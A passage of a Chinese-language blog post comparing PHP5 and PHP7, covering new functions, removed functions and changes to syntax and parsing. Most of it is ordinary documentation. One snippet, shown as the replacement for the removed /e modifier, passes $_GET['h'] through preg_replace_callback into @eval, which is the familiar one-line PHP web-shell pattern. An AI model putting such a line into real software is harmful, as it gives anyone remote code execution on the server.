<code>foreach</code>在迭代中能更好的跟踪变化。例如，在迭代中添加一个迭代值到数组中，参考下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [<span class="hljs-number">0</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$val</span>);<br>    <span class="hljs-variable">$array</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP5<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><br>PHP7<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br></code></pre></td></tr></table></figure><h2 id="filter-var转换十六进制数字"><a href="#filter-var转换十六进制数字" class="headerlink" title="filter_var转换十六进制数字"></a>filter_var转换十六进制数字</h2><p><code>filter_var</code> 函数可以用于检查一个 <code>string</code> 是否含有十六进制数字,并将其转换为<code>integer</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;0xffff&quot;</span>;<br><span class="hljs-variable">$int</span> = <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$int</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid integer!&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$int</span>); <span class="hljs-comment">// int(65535)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="通过-define-定义常量数组"><a href="#通过-define-定义常量数组" class="headerlink" title="通过 define 定义常量数组"></a>通过 define 定义常量数组</h2><p>Array 类型的常量现在可以通过 <code>define()</code> 来定义。在 PHP5.6 中仅能通过 <code>const</code> 定义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>define(<span class="hljs-string">&#x27;ANIMALS&#x27;</span>, [    <span class="hljs-string">&#x27;dog&#x27;</span>,    <span class="hljs-string">&#x27;cat&#x27;</span>,    <span class="hljs-string">&#x27;bird&#x27;</span>]);<span class="hljs-keyword">echo</span> ANIMALS[<span class="hljs-number">1</span>]; <span class="hljs-comment">// 输出 &quot;cat&quot;?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="为unserialize-提供过滤"><a href="#为unserialize-提供过滤" class="headerlink" title="为unserialize()提供过滤"></a>为unserialize()提供过滤</h2><p>这个特性旨在提供更安全的方式解包不可靠的数据。它通过白名单的方式来防止潜在的代码注入。</p><p>可选白名单参数也可以是布尔数据，如果是FALSE就会将所有的对象都转换为<code>__PHP_Incomplete_Class</code>对象。TRUE是无限制。也可以传入类名实现白名单。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">class</span> a&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;123&#x27;</span>;&#125;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$unse</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>,[<span class="hljs-string">&quot;allowed_classes&quot;</span> =&gt; <span class="hljs-literal">false</span>]);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unse</span>);<span class="hljs-variable">$unse</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>,[<span class="hljs-string">&quot;allowed_classes&quot;</span> =&gt; <span class="hljs-literal">true</span>]);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unse</span>);<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_2.png"></p><h2 id="session-start可以加入一个数组"><a href="#session-start可以加入一个数组" class="headerlink" title="session_start可以加入一个数组"></a>session_start可以加入一个数组</h2><p><code>session_start()</code> 可以接受一个 <code>array</code> 作为参数， 用来覆盖 php.ini 文件中设置的 <a href="https://www.php.net/manual/zh/session.configuration.php">会话配置选项</a>。</p><p>在调用 <code>session_start()</code> 的时候， 传入的选项参数中也支持 <code>session.lazy_write</code> 行为， 默认情况下这个配置项是打开的。它的作用是控制 PHP 只有在会话中的数据发生变化的时候才 写入会话存储文件，如果会话中的数据没有发生改变，那么 PHP 会在读取完会话数据之后， 立即关闭会话存储文件，不做任何修改，可以通过设置 <code>read_and_close</code>来实现。</p><p>例如，下列代码设置 <code>session.cache_limiter</code> 为 <em>private</em>，并且在读取完毕会话数据之后马上关闭会话存储文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start([    <span class="hljs-string">&#x27;cache_limiter&#x27;</span> =&gt; <span class="hljs-string">&#x27;private&#x27;</span>,    <span class="hljs-string">&#x27;read_and_close&#x27;</span> =&gt; <span class="hljs-literal">true</span>,]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="preg-replaces不再支持-e修饰符"><a href="#preg-replaces不再支持-e修饰符" class="headerlink" title="preg_replaces不再支持&#x2F;e修饰符"></a>preg_replaces不再支持&#x2F;e修饰符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>]=<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&quot;/.*/&quot;</span>,function (<span class="hljs-variable">$a</span>)&#123;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]);&#125;,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;h&quot;</span>]);<br></code></pre></td></tr></table></figure><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E5%87%BD%E6%95%B0%E6%96%B9%E9%9D%A2_1.png"></p><p>但是有新的函数<code>preg_replace_callback</code></p><h2 id="dirname增加了参数"><a href="#dirname增加了参数" class="headerlink" title="dirname增加了参数"></a>dirname增加了参数</h2><p><code>dirname()</code> 增加了可选的第二个参数, <code>depth</code>, 获取当前目录向上 <code>depth</code> 级父目录的名称</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-string">&#x27;c:/a/b/c/d&#x27;</span>,<span class="hljs-number">1</span>);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">#结果/*c:/a/b/c*/</span><br></code></pre></td></tr></table></figure><h2 id="system等函数对NULL增加了保护"><a href="#system等函数对NULL增加了保护" class="headerlink" title="system等函数对NULL增加了保护."></a>system等函数对NULL增加了保护.</h2><p><code>exec()</code>, <code>system()</code> and <code>passthru()</code> 函数对 NULL 增加了保护（我也不知道啥意思。</p><h2 id="增加整数除法函数-intdiv"><a href="#增加整数除法函数-intdiv" class="headerlink" title="增加整数除法函数 intdiv"></a>增加整数除法函数 intdiv</h2><p>新加的函数 <code>intdiv()</code> 用来进行 整数的除法运算。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(<span class="hljs-title function_ invoke__">intdiv</span>(<span class="hljs-number">10</span>, <span class="hljs-number">3</span>));<span class="hljs-comment">// int(3)?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="增加preg-replace-callback-array"><a href="#增加preg-replace-callback-array" class="headerlink" title="增加preg_replace_callback_array"></a>增加preg_replace_callback_array</h2><p>在 PHP 7 之前，当使用 <code>preg_replace_callback()</code> 函数的时候， 由于针对每个正则表达式都要执行回调函数，可能导致过多的分支代码。 而使用新加的 <code>preg_replace_callback_array()</code> 函数， 可以使得代码更加简洁。</p><p>现在，可以使用一个关联数组来对每个正则表达式注册回调函数， 正则表达式本身作为关联数组的键， 而对应的回调函数就是关联数组的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$subject</span> = <span class="hljs-string">&#x27;Aaaaaa Bbb&#x27;</span>;<span class="hljs-title function_ invoke__">preg_replace_callback_array</span>(    [        <span class="hljs-string">&#x27;~[a]+~i&#x27;</span> =&gt; function (<span class="hljs-variable">$match</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">0</span>]), <span class="hljs-string">&#x27; matches for &quot;a&quot; found&#x27;</span>, PHP_EOL;        &#125;,        <span class="hljs-string">&#x27;~[b]+~i&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$match</span></span>) </span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$match</span>[<span class="hljs-number">0</span>]), <span class="hljs-string">&#x27; matches for &quot;b&quot; found&#x27;</span>, PHP_EOL;        &#125;    ],    <span class="hljs-variable">$subject</span>);    <span class="hljs-comment">/*6 matches for &quot;a&quot; found3 matches for &quot;b&quot; found*/</span><br></code></pre></td></tr></table></figure><h2 id="增加Closure-call"><a href="#增加Closure-call" class="headerlink" title="增加Closure::call()"></a>增加Closure::call()</h2><p><strong>Closure::call()</strong> 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">class</span> A &#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$x</span> = <span class="hljs-number">1</span>;&#125;<span class="hljs-comment">// PHP 7 之前版本的代码$getXCB = function() &#123;return $this-&gt;x;&#125;;$getX = $getXCB-&gt;bindTo(new A, &#x27;A&#x27;); // 中间层闭包echo $getX();// PHP 7+ 及更高版本的代码$getX = function() &#123;return $this-&gt;x;&#125;;echo $getX-&gt;call(new A);#结果/*11*/</span><br></code></pre></td></tr></table></figure><h2 id="被移除的函数"><a href="#被移除的函数" class="headerlink" title="被移除的函数"></a>被移除的函数</h2><ul><li><p><code>call_user_method</code>和<code>call_user_method_array</code></p></li><li><p>所有的<code>ereg*</code>函数</p></li><li><p><code>mcrypt</code>的一部分废弃函数</p></li><li><p>所有<code>ext/mysql</code>函数</p></li><li><p>所有<code>ext/mssql</code>函数</p></li><li><p>dl in PHP-FPM</p><p>dl()在 PHP-FPM 不再可用，在 CLI 和 embed SAPIs 中仍可用。</p></li></ul><h1 id="语法变更"><a href="#语法变更" class="headerlink" title="语法变更"></a>语法变更</h1><h2 id="关于变量处理的变化"><a href="#关于变量处理的变化" class="headerlink" title="关于变量处理的变化"></a>关于变量处理的变化</h2><p>PHP 7 现在使用了抽象语法树来解析源代码。这使得许多由于之前的PHP的解释器的限制所不可能实现的改进得以实现。 但出于一致性的原因导致了一些特殊例子的变动，而这些变动打破了向后兼容。 在这一章中将详细介绍这些例子。</p><h2 id="关于间接使用变量、属性和方法的变化"><a href="#关于间接使用变量、属性和方法的变化" class="headerlink" title="关于间接使用变量、属性和方法的变化"></a>关于间接使用变量、属性和方法的变化</h2><p>对变量、属性和方法的间接调用现在将严格遵循从左到右的顺序来解析，而不是之前的混杂着几个特殊案例的情况。 下面这张表说明了这个解析顺序的变化。</p><p>​<strong>间接调用的表达式的新旧解析顺序</strong></p><table><thead><tr><th align="left">表达式</th><th align="left">PHP 5 的解析方式</th><th align="left">PHP 7 的解析方式</th></tr></thead><tbody><tr><td align="left"><code>$$foo[&#39;bar&#39;][&#39;baz&#39;]</code></td><td align="left"><code>$&#123;$foo[&#39;bar&#39;][&#39;baz&#39;]&#125;</code></td><td align="left"><code>($$foo)[&#39;bar&#39;][&#39;baz&#39;]</code></td></tr><tr><td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]</code></td><td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;</code></td><td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]</code></td></tr><tr><td align="left"><code>$foo-&gt;$bar[&#39;baz&#39;]()</code></td><td align="left"><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;()</code></td><td align="left"><code>($foo-&gt;$bar)[&#39;baz&#39;]()</code></td></tr><tr><td align="left"><code>Foo::$bar[&#39;baz&#39;]()</code></td><td align="left"><code>Foo::&#123;$bar[&#39;baz&#39;]&#125;()</code></td><td align="left"><code>(Foo::$bar)[&#39;baz&#39;]()</code></td></tr></tbody></table><p>使用了旧的从右到左的解析顺序的代码必须被重写，明确的使用大括号来表明顺序（参见上表中间一列）。 这样使得代码既保持了与PHP 7.x的前向兼容性，又保持了与PHP 5.x的后向兼容性。</p><p>这同样影响了<a href="https://www.php.net/manual/zh/language.variables.scope.php#language.variables.scope.global"><strong>global</strong></a> 关键字。如果需要的话可以使用大括号来模拟之前的行为。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// Valid in PHP 5 only.</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$$foo</span>-&gt;bar;<br><br>    <span class="hljs-comment">// Valid in PHP 5 and 7.</span><br>    <span class="hljs-keyword">global</span> $&#123;<span class="hljs-variable">$foo</span>-&gt;bar&#125;;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="8进制字符容错率降低"><a href="#8进制字符容错率降低" class="headerlink" title="8进制字符容错率降低"></a>8进制字符容错率降低</h2><p>在php5版本，如果一个八进制字符如果含有无效数字，该无效数字将被静默删节。但是在php7.0.0里面会触发一个解析错误。同样在php7.0.0以后被改回去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 在php5和php7.0.0之外的版本测试结果应该如下</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012999999999999&#x27;</span> ) . <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-comment">// 10</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012&#x27;</span> ) . <span class="hljs-string">&quot;\n&quot;</span>;                <span class="hljs-comment">// 10</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012999999999999&#x27;</span> )==<span class="hljs-title function_ invoke__">octdec</span>( <span class="hljs-string">&#x27;012&#x27;</span> ))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;: )&quot;</span>. <span class="hljs-string">&quot;\n&quot;</span>;                   <span class="hljs-comment">// : )</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="负位移运算"><a href="#负位移运算" class="headerlink" title="负位移运算"></a>负位移运算</h2><p>以负数形式进行的位移运算将会抛出一个 <strong>ArithmeticError</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">1</span> &gt;&gt; -<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">PHP5<br>int(0)<br><br>PHP7<br>Fatal <span class="hljs-keyword">error</span>: Uncaught ArithmeticError: Bit shift <span class="hljs-keyword">by</span> negative number <span class="hljs-keyword">in</span> /tmp/<span class="hljs-keyword">test</span>.php:2<br><span class="hljs-keyword">Stack</span> trace:<br>#0 &#123;main&#125;<br>  thrown <span class="hljs-keyword">in</span> /tmp/<span class="hljs-keyword">test</span>.php <span class="hljs-keyword">on</span> <span class="hljs-keyword">line</span> 2<br><br></code></pre></td></tr></table></figure><h2 id="超范围后产生位移"><a href="#超范围后产生位移" class="headerlink" title="超范围后产生位移"></a>超范围后产生位移</h2><p>超出 <code>integer</code>位宽的位移操作（无论哪个方向）将始终得到 0 作为结果。在从前，这一操作是结构依赖的</p><h2 id="十六进制字符串规范"><a href="#十六进制字符串规范" class="headerlink" title="十六进制字符串规范"></a>十六进制字符串规范</h2><p>十六进制字符串不再被认为是数字</p><p>目前截至最新的PHP7.3版本依然没有改回去的征兆，官方称不会在改了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0x123&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0x123&quot;</span> == <span class="hljs-string">&quot;291&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;0x123&quot;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0xe&quot;</span> + <span class="hljs-string">&quot;0x1&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;0x1&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果:</p><p>左边php5.6，右边php7.2</p><p><img src="/Users/j7ur8/WebBook/BookBuild/images/19-7-22_PHP_PHP7%E5%92%8CPHP5%E7%9A%84%E5%8C%BA%E5%88%AB_%E8%AF%AD%E6%B3%95%E4%BF%AE%E6%94%B9_1.png"></p><p><a href="https://www.php.net/manual/zh/function.filter-var.php">filter_var()</a> 函数可以用于检查一个 <a href="https://www.php.net/manual/zh/language.types.string.php">string</a> 是否含有十六进制数字,并将其转换为<a href="https://www.php.net/manual/zh/language.types.integer.php">integer</a>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;0xffff&quot;</span>;<br><span class="hljs-variable">$int</span> = <span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$str</span>, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$int</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Invalid integer!&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$int</span>); <span class="hljs-comment">// int(65535)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于新的 <a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.unicode-codepoint-escape-syntax">Unicode codepoint escape syntax</a>语法， 紧连着无效序列并包含<em>\u{</em> 的字串可能引起致命错误。 为了避免这一报错，应该避免反斜杠开头。</p><h2 id="移除了-ASP-和-script-PHP-标签"><a href="#移除了-ASP-和-script-PHP-标签" class="headerlink" title="移除了 ASP 和 script PHP 标签"></a>移除了 ASP 和 script PHP 标签</h2><p>使用类似 ASP 的标签，以及 script 标签来区分 PHP 代码的方式被移除。 受到影响的标签有：</p><table><thead><tr><th align="left">开标签</th><th align="left">闭标签</th></tr></thead><tbody><tr><td align="left"><code>&lt;%</code></td><td align="left"><code>%&gt;</code></td></tr><tr><td align="left"><code>&lt;%=</code></td><td align="left"><code>%&gt;</code></td></tr><tr><td align="left"><code>&lt;script language=&quot;php&quot;&gt;</code></td><td align="left"><code>&lt;/script&gt;</code></td></tr></tbody></table><h2 id="yield-变更为右联接运算符"><a href="#yield-变更为右联接运算符" class="headerlink" title="yield 变更为右联接运算符"></a>yield 变更为右联接运算符</h2><p>在使用 <code>yield</code> 关键字的时候，不再需要括号， 并且它变更为右联接操作符，其运算符优先级介于 <em>print</em> 和 <em>&#x3D;&gt;</em> 之间。 这可能导致现有代码的行为发生改变：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">yield</span> -<span class="hljs-number">1</span>;<br><span class="hljs-comment">// 在之前版本中会被解释为：</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-keyword">yield</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 现在，它将被解释为：</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">yield</span> (-<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">yield</span> <span class="hljs-variable">$foo</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br><span class="hljs-comment">// 在之前版本中会被解释为：</span><br><span class="hljs-keyword">yield</span> (<span class="hljs-variable">$foo</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>);<br><span class="hljs-comment">// 现在，它将被解释为：</span><br>(<span class="hljs-keyword">yield</span> <span class="hljs-variable">$foo</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以通过使用括号来消除歧义。</p><h2 id="关于对引用数组元素创建的变量的顺序变化"><a href="#关于对引用数组元素创建的变量的顺序变化" class="headerlink" title="关于对引用数组元素创建的变量的顺序变化"></a>关于对引用数组元素创建的变量的顺序变化</h2><p>有如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = [];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;a&quot;</span>] =&amp; <span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;b&quot;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP5<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;b&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;a&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br><br>PHP7<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> &#123;<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;a&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>  <span class="hljs-selector-attr">[<span class="hljs-string">&quot;b&quot;</span>]</span>=&gt;<br>  &amp;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="NULL合并运算符"><a href="#NULL合并运算符" class="headerlink" title="NULL合并运算符"></a>NULL合并运算符</h2><p>由于日常使用中存在大量同时使用三元表达式和 <code>isset()</code>的情况， 我们添加了null合并运算符 (<em>??</em>) 这个语法糖。如果变量存在且值不为<strong>NULL</strong>， 它就会返回自身的值，否则返回它的第二个操作数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sss</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$sss</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$sss</span>= <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$sss</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$bbb</span> ?? <span class="hljs-string">&#x27;aaa&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">#结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">aaa</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">aaa</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="太空船操作符（组合比较符）"><a 